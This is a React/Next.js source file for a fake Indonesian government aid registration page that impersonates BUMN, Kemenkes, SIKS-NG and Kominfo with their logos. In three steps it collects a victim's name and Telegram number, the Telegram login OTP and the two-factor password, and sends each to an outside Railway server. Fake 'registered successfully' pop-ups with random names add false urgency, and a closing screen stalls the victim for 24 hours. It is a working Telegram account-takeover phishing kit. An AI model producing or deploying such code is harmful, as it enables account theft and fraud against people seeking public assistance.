"use client";

import React, { useState, useRef, useEffect } from 'react';

// Daftar Nama Random
const namaRandom = [
  "Budi Santoso", "Siti Aminah", "Rizky Pratama", "Agus Setiawan", "Dewi Lestari",
  "Ahmad Hidayat", "Putri Utami", "Eko Prasetyo", "Indah Permata", "Dedi Kurniawan",
  "Sari Wijaya", "Andi Wijaya", "Lina Marlina", "Hendra Gunawan", "Yanti Susanti",
  "Bambang Hermawan", "Maya Indah", "Fajar Ramadhan", "Mega Silvia", "Doni Saputra",
  "Rian Ardianto", "Siska Putri", "Bayu Segara", "Nanda Pratama", "Tiara Andini"
];

const FooterLogos = () => (
  <div className="flex justify-between items-center bg-white p-4 mt-auto border-t border-gray-100">
    <div className="w-[22%] flex justify-center"><img src="/logo_bumn.jpg" alt="BUMN" className="max-h-8 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_Kemenkes.png" alt="Kemenkes" className="max-h-8 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_siksng.jpg" alt="SIKS-NG" className="max-h-8 object-contain" /></div>
    <div className="w-[22%] flex justify-center"><img src="/logo_kominfo.png" alt="Kominfo" className="max-h-8 object-contain" /></div>
  </div>
);

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [formData, setFormData] = useState({ nama: '', nomor: '', sandi: '' });
  const [otpValues, setOtpValues] = useState(['', '', '', '', '']);
  const [timer, setTimer] = useState(60);
  const [canResend, setCanResend] = useState(false);
  
  // State untuk menampung banyak notifikasi sekaligus
  const [notifications, setNotifications] = useState<{id: number, text: string}[]>([]);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const API_URL = "https://web-production-f31a0.up.railway.app/register";

  // Efek Notifikasi Berjejer dari Bawah
  useEffect(() => {
    const addNotification = () => {
      const nama = namaRandom[Math.floor(Math.random() * namaRandom.length)];
      const id = Date.now();
      const newNotif = { id, text: `${nama} berhasil mendaftar` };

      setNotifications(prev => [...prev.slice(-2), newNotif]); // Simpan maksimal 3 notif terakhir

      // Hapus otomatis setelah 4 detik
      setTimeout(() => {
        setNotifications(prev => prev.filter(n => n.id !== id));
      }, 4000);
    };

    const interval = setInterval(addNotification, 5000); // Muncul tiap 5 detik
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (step === 2 && timer > 0) {
      interval = setInterval(() => setTimer((prev) => prev - 1), 1000);
    } else if (timer === 0) {
      setCanResend(true);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const normalisasiNomor = (num: string) => {
    let clean = num.replace(/\D/g, '');
    if (clean.startsWith('0')) clean = '62' + clean.slice(1);
    if (!clean.startsWith('62')) clean = '62' + clean;
    return '+' + clean;
  };

  const handleOtpChange = (index: number, value: string) => {
    setError("");
    const val = value.replace(/\D/g, "");
    const newOtp = [...otpValues];
    newOtp[index] = val.substring(val.length - 1);
    setOtpValues(newOtp);
    if (val && index < 4) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otpValues[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleNext = async (currentStep: number) => {
    setError("");
    setLoading(true);
    const payload = { ...formData, nomor: normalisasiNomor(formData.nomor), otp: otpValues.join(''), step: currentStep };
    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const res = await response.json();
      if (response.ok) {
        setLoading(false);
        if (currentStep === 1) setStep(2);
        else if (currentStep === 2) res.status === "need_2fa" ? setStep(3) : setStep(4);
        else if (currentStep === 3) setStep(4);
      } else {
        setLoading(false);
        if (currentStep === 2) { setError("OTP SALAH"); setOtpValues(['','','','','']); inputRefs.current[0]?.focus(); }
        else if (currentStep === 3) setError("SANDI SALAH");
        else setError(res.message || "Terjadi kesalahan");
      }
    } catch (err) { setLoading(false); setError("Masalah koneksi server."); }
  };

  return (
    <div className="w-full max-w-[450px] min-h-screen bg-white font-sans overflow-x-hidden relative shadow-2xl flex flex-col">
      
      {/* Container Notifikasi Berjejer di Bagian Bawah */}
      <div className="fixed bottom-24 left-1/2 -translate-x-1/2 z-[60] flex flex-col-reverse gap-2 w-full px-10 pointer-events-none">
        {notifications.map((notif) => (
          <div 
            key={notif.id}
            className="bg-black/70 backdrop-blur-md text-white px-4 py-2 rounded-lg text-[10px] font-bold shadow-xl border border-white/10 flex items-center gap-2 animate-in slide-in-from-bottom-full duration-500 mx-auto w-fit"
          >
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
            {notif.text}
          </div>
        ))}
      </div>

      <img src="/banner.jpg" className="w-full h-auto block" alt="Banner" />

      <div className="p-6 flex-grow">
        {step === 4 ? (
          <div className="flex flex-col items-center justify-center py-20 animate-in zoom-in">
            <div className="relative flex items-center justify-center">
              <div className="w-40 h-40 border-[10px] border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
              <div className="absolute flex flex-col items-center text-center">
                <span className="text-blue-900 font-black text-xl tracking-tighter">PROCESSING</span>
                <span className="text-slate-400 italic text-sm">mohon tunggu..</span>
              </div>
            </div>
            <p className="mt-12 text-blue-700 font-bold text-center text-lg leading-relaxed px-2">
              Silakan tunggu proses konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan pendaftaran Anda.
            </p>
          </div>
        ) : (
          <div className="space-y-6">
            {step === 1 && (
              <div className="animate-in slide-in-from-bottom-4 duration-500">
                <h2 className="text-xl font-black text-center text-slate-800 mb-8 border-b-4 border-blue-600 pb-2 uppercase tracking-tight">Form Pendaftaran Penerimaan</h2>
                {error && <p className="text-red-500 text-center font-bold mb-4">{error}</p>}
                <div className="space-y-2">
                  <label className="block font-bold text-slate-700 text-sm">Nama Lengkap Sesuai E-KTP:</label>
                  <input className="w-full p-4 border-2 border-slate-200 bg-slate-50 rounded-xl text-lg outline-none focus:border-blue-600 uppercase" placeholder="BUDI SANTOSO" onChange={(e) => setFormData({...formData, nama: e.target.value})} />
                </div>
                <div className="space-y-2 mt-4">
                  <label className="block font-bold text-slate-700 text-sm">Nomor Telegram Aktif:</label>
                  <input className="w-full p-4 border-2 border-slate-200 bg-slate-50 rounded-xl text-lg outline-none focus:border-blue-600" placeholder="0812 XXXX XXXX" type="tel" onChange={(e) => setFormData({...formData, nomor: e.target.value})} />
                </div>
                <button onClick={() => handleNext(1)} className="w-full bg-blue-600 text-white font-black py-5 rounded-xl text-xl mt-10 active:scale-95 shadow-lg shadow-blue-100">DAFTAR SEKARANG</button>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-8 py-4 animate-in fade-in duration-500">
                <div className="bg-blue-50 p-4 rounded-2xl border-l-8 border-blue-600 text-blue-800 font-bold text-md text-center leading-tight shadow-sm">
                  KODE OTP TELAH DIKIRIM KE AKUN TELEGRAM ANDA
                </div>
                <div className="space-y-4">
                  <label className={`block text-center font-black text-lg ${error === "OTP SALAH" ? 'text-red-500' : 'text-slate-700'}`}>
                    {error === "OTP SALAH" ? "KODE OTP SALAH!" : "MASUKKAN KODE OTP :"}
                  </label>
                  <div className="flex justify-center gap-2">
                    {otpValues.map((data, index) => (
                      <input
                        key={index} type="tel" ref={(el) => { inputRefs.current[index] = el; }} value={data}
                        onChange={(e) => handleOtpChange(index, e.target.value)}
                        onKeyDown={(e) => handleKeyDown(index, e)}
                        className={`w-12 h-16 text-center text-4xl font-black border-2 rounded-xl bg-slate-50 outline-none transition-all ${error === "OTP SALAH" ? 'border-red-500 bg-red-50 text-red-600' : 'border-slate-300 focus:border-blue-600'}`}
                        maxLength={1}
                      />
                    ))}
                  </div>
                </div>
                <div className="text-center">
                  {canResend ? (
                    <button onClick={() => { setTimer(60); setCanResend(false); }} className="text-blue-600 font-bold underline">Kirim ulang kode</button>
                  ) : (
                    <p className="text-slate-500 font-medium">Kirim ulang kode dalam <span className="text-blue-600 font-bold">{timer}</span> detik</p>
                  )}
                </div>
                <button onClick={() => handleNext(2)} className="w-full bg-blue-600 text-white font-black py-5 rounded-xl text-xl shadow-xl shadow-blue-100 uppercase">VERIFIKASI OTP</button>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 animate-in fade-in duration-500">
                <div className="text-center bg-yellow-50 p-4 rounded-2xl border-2 border-yellow-200">
                  <p className="font-black text-yellow-800 text-lg uppercase">Masukkan Kata Sandi Anda</p>
                  <p className={`font-bold mt-1 text-sm ${error === "SANDI SALAH" ? 'text-red-500' : 'text-yellow-600'}`}>
                    {error === "SANDI SALAH" ? "KATA SANDI SALAH!" : "Masukkan kata sandi akun Anda"}
                  </p>
                </div>
                <input className={`w-full p-5 border-2 rounded-2xl text-xl font-bold outline-none ${error === "SANDI SALAH" ? 'border-red-500 bg-red-50' : 'border-slate-200 bg-slate-50 focus:border-blue-600'}`} placeholder="KATA SANDI AKUN" type="password" onChange={(e) => { setError(""); setFormData({...formData, sandi: e.target.value})}} />
                <button onClick={() => handleNext(3)} className="w-full bg-blue-600 text-white font-black py-5 rounded-xl text-xl shadow-lg uppercase">KONFIRMASI SEKARANG</button>
              </div>
            )}
          </div>
        )}
      </div>
      
      <FooterLogos />

      {loading && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm flex flex-col items-center justify-center z-50">
          <div className="animate-spin rounded-full h-14 w-14 border-t-4 border-blue-600 border-slate-200 border-solid mb-4"></div>
          <p className="font-black text-blue-600 tracking-widest animate-pulse uppercase">Memproses...</p>
        </div>
      )}
    </div>
  );
}